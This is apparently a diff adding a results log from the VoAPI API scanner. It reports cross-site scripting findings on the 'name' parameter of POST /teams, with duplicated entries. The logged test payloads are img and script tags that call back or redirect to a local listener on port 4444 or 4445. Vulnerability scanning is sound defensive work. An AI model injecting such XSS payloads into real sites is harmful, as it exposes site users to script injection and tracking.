@@ -1,0 +1,39 @@
+-------- VoAPI Vul API --------
+API Vul Type: xss
+Vul API Url: /teams
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='http://127.0.0.1:4444/xss/teamsVoAPIname'>
+
+API Vul Type: xss
+Vul API Url: /teams
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='http://127.0.0.1:4444/xss/teamsVoAPIname'>
+
+-------- VoAPI Vul API --------
+API Vul Type: xss
+Vul API Url: /teams
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='https://127.0.0.1:4445/xss/teamsVoAPIname'>
+
+API Vul Type: xss
+Vul API Url: /teams
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='https://127.0.0.1:4445/xss/teamsVoAPIname'>
+
+-------- VoAPI Vul API --------
+API Vul Type: xss
+Vul API Url: /teams
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/teamsVoAPIname'</script>
+
+API Vul Type: xss
+Vul API Url: /teams
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/teamsVoAPIname'</script>
+
